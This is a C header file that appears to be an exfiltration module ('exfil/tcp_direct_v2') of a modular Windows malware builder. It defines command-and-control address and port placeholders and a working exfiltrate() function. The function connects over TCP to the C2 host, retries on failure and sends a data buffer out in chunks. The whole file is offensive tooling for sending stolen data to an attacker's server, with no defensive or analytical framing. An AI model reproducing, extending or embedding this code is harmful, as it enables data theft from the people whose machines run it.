// chunk: exfil/tcp_direct_v2
// depends: core/emit_buffer
// provides: exfiltrate
// headers: winsock2.h, ws2tcpip.h
// libs: ws2_32

#ifndef CHUNK_TCP_DIRECT_V2
#define CHUNK_TCP_DIRECT_V2

#include <winsock2.h>
#include <ws2tcpip.h>

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}

static BOOL exfiltrate(const char *ip, WORD port, const char *data, DWORD len) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return FALSE;

    struct addrinfo hints, *result = NULL;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    char port_str[8];
    _snprintf(port_str, sizeof(port_str), "%u", (unsigned)port);

    if (getaddrinfo(ip, port_str, &hints, &result) != 0 || !result) {
        WSACleanup();
        return FALSE;
    }

    SOCKET sock = INVALID_SOCKET;
    int retries = 3;
    while (retries-- > 0) {
        sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
        if (sock == INVALID_SOCKET) break;

        // Set socket timeouts (10s) to prevent indefinite blocking
        DWORD timeout_ms = 10000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));

        if (connect(sock, result->ai_addr, (int)result->ai_addrlen) == 0)
            break;
        closesocket(sock);
        sock = INVALID_SOCKET;
        if (retries > 0) Sleep(3000);
    }

    freeaddrinfo(result);

    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return FALSE;
    }

    DWORD sent = 0;
    while (sent < len) {
        DWORD chunk = len - sent;
        if (chunk > 4096) chunk = 4096;
        int n = send(sock, data + sent, (int)chunk, 0);
        if (n <= 0) break;
        sent += (DWORD)n;
    }

    closesocket(sock);
    WSACleanup();
    return sent == len;
}

#endif
